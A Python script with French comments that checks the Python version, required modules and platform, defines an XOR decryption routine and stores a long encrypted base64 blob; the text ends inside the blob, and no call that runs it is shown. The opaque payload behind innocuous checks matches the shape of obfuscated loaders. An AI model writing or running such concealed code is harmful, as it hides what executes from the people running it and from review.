#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Compatible avec toutes les distributions Linux
# Ubuntu, Debian, CentOS, RHEL, Fedora, Arch, Alpine, etc.

import sys
import os
import base64
import zlib
import warnings

# Suppression des warnings inutiles
warnings.filterwarnings('ignore', category=SyntaxWarning)
warnings.filterwarnings('ignore', category=DeprecationWarning)

# ============================================================================
# VÉRIFICATIONS DE COMPATIBILITÉ STRICTES
# ============================================================================

# Constante de version minimale (accessible globalement)
_MIN_VERSION = (3, 6)

# 1. Vérification Python 3 stricte
if sys.version_info.major != 3:
    print("ERREUR: Python 3 est requis")
    print("Ce script doit être exécuté avec python3, pas python")
    print()
    print("Commande correcte:")
    print(f"  python3 {sys.argv[0]}")
    print()
    print("Si python3 n'est pas disponible, installez-le:")
    print("  Ubuntu/Debian: sudo apt install python3")
    print("  CentOS/RHEL:   sudo yum install python3")
    print("  Arch:          sudo pacman -S python")
    print("  Alpine:        apk add python3")
    sys.exit(1)

# 2. Vérification version Python minimale
if sys.version_info < _MIN_VERSION:
    print(f"ERREUR: Python {_MIN_VERSION[0]}.{_MIN_VERSION[1]}+ est requis")
    print(f"Version actuelle: {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
    print()
    print("Mettez à jour Python:")
    print("  Ubuntu/Debian: sudo apt install python3.{_MIN_VERSION[1]+1}")
    print("  CentOS/RHEL8:  sudo dnf install python3")
    print("  CentOS7:       sudo yum install python36")
    sys.exit(1)

# 3. Vérification des modules essentiels
_REQUIRED_MODULES = ['base64', 'zlib']
_missing_modules = []
for module in _REQUIRED_MODULES:
    try:
        __import__(module)
    except ImportError:
        _missing_modules.append(module)

if _missing_modules:
    print("ERREUR: Modules Python essentiels manquants")
    print("Manquant:", ", ".join(_missing_modules))
    print()
    print("Ces modules font partie de la bibliothèque standard Python.")
    print("Votre installation Python semble corrompue.")
    print("Réinstallez Python 3.6+ depuis les sources officielles.")
    sys.exit(1)

# 4. Détection de la plateforme
_IS_LINUX = sys.platform.startswith('linux')
_IS_WINDOWS = sys.platform.startswith('win')
_IS_MACOS = sys.platform.startswith('darwin')
_IS_CYGWIN = sys.platform.startswith('cygwin')

_SUPPORTED = _IS_LINUX or _IS_WINDOWS or _IS_MACOS or _IS_CYGWIN

if not _SUPPORTED:
    print(f"ERREUR: Plateforme non supportée: {sys.platform}")
    print()
    print("Plateformes supportées:")
    print("  • Linux (toutes distributions)")
    print("  • Windows (avec Python 3)")
    print("  • macOS (10.9+)")
    print("  • Cygwin (Windows)")
    sys.exit(1)

# 5. Détection musl/glibc (pour Alpine Linux)
try:
    import platform
    libc_info = platform.libc_ver()
    _LIBC_TYPE = libc_info[0] if libc_info else 'glibc'
    if _LIBC_TYPE == 'musl':
        print("INFO: Alpine Linux (musl) détecté - compatibilité vérifiée")
except:
    _LIBC_TYPE = 'unknown'

# ============================================================================
# DÉCHIFFREMENT
# ============================================================================

# Fonction de déchiffrement XOR (compatible toutes versions Python)
def _xor_decrypt(data: bytes, key: bytes) -> bytes:
    """Décryptage XOR ultra-compatible"""
    key_length = len(key)
    result = bytearray(len(data))
    
    for i in range(len(data)):
        result[i] = data[i] ^ key[i % key_length]
    
    return bytes(result)

# Données obfusquées
_ENCRYPTED_DATA = "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